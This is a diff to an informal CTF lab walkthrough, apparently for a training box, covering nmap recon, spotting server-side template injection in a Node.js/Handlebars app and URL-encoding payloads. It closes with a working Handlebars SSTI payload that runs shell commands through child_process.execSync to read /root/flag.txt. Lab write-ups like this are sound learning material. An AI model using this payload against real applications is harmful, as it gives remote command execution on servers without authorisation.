@@ -1,4 +1,4 @@
-![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/8ccfeabd-6654-4e8a-89f4-c3393769a709)
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/a254f3ad-6a33-44e6-ab26-12548fcc2cf7)![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/323fcf13-a590-4eaf-87da-fba13a4054a6)![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/8ccfeabd-6654-4e8a-89f4-c3393769a709)
 
 1. What does the acronym SQL stand for?
 We need to check it in google, i don't rember the acronym SQL, i found this 
@@ -308,3 +308,93 @@ https://www.beckershospitalreview.com/cybersecurity/30-most-common-passwords-of-
 
 And also there we can find the flag :D
 We got this uhu :D
+
+
+The next labis 
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/51084245-8af5-4b82-99c2-2b6c2d4f3cdf)
+
+1. What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high. 
+We need to run nmap, and do some recon to know what's running on the server
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/8f3572c2-f8d7-443f-a32f-885efb1de30a)
+
+The standard port running on the server SSH and HTTP
+2. What software is running the service listening on the http/web port identified in the first question? 
+The can be know from the previouse scan, on the 80 sever running the software: Node.js
+
+3. What is the name of the Web Framework according to Wappalyzer? 
+We need to go on the website, and check in the wappalyzer what's freamework using the server, and there we can see this:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/a7ba755f-e1eb-49eb-8fd8-87677da83769)
+
+4. What is the name of the vulnerability we test for by submitting {{7*7}}? 
+This is (SSTI) Server Side Template Injection, Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. 
+
+5. What is the templating engine being used within Node.JS? 
+In this situation, when you know there can be SSTI i recommend use from portswigger decision tree similar, here is the screan:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/544fccdf-56af-449d-9ba9-4b5c57f234b8
+
+doing step by step, you can recognaize what kind of engine server used, after few attemp i got this, when i inser {{7*7}} i got this error
+And also there you can find this engine
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/78177712-5b84-4e04-8ac8-e859f115d302)
+
+6. What is the name of the BurpSuite tab used to encode text? 
+This is easy to find, here you can decode and encode the text:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/9a829e49-82d5-49f5-be10-b5cc7623012b)
+
+7. In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use? 
+A specially when you tryning decoed some payload to website recomended is URL, also in this situation we will use URL, here is a example:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e2a9fa0f-5ba7-4d6b-a712-7d2d8cc65022)
+
+8. When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error? 
+I used this payload:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/e9c718d0-5095-4e28-ae05-4cb12cd45739)
+
+But rember to decoed this in URL, and also below u can find this exploit decoed in URL, inser this in email= and you will get this kind of error 
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/7fbda265-8cfc-4be9-aafa-df982d313b92)
+
+9. What variable is the name of the top-level scope in Node.JS? 
+This we need to google, bacause i have no idea, this what i found, the answer is:
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/5f4b7fb7-4ed2-460f-b038-0c814883d6dc)
+
+But i have no idea why i need this in this lab
+
+10. By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user? 
+11. Submit root flag 
+
+I will answer for this question
+
+{{#with "s" as |string|}}  
+{{#with "e"}}  
+{{#with split as |conslist|}}  
+{{this.pop}}  
+{{this.push (lookup string.sub "constructor")}}  
+{{this.pop}}  
+{{#with string.split as |codelist|}}  
+{{this.pop}}  
+{{this.push "return  process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}  
+{{this.pop}}  
+{{#each conslist}}  
+{{#with (string.sub.apply 0 codelist)}}  
+{{this}}  
+{{/with}}  
+{{/each}}  
+{{/with}}  
+{{/with}}  
+{{/with}}  
+{{/with}}
+
+You need to change execSync('whoami') to know, how we are, and if you want read flag, this must you write ('cat /root/flag.txt')
+This what i get, but rember to decode this in URL :P
+
+![obraz](https://github.com/Anogota/You-need-to-walk-before-you-can-run/assets/143951834/fc3968a6-dbdb-476b-bcbd-4261c0ef2d90)
+
+And we did this :)
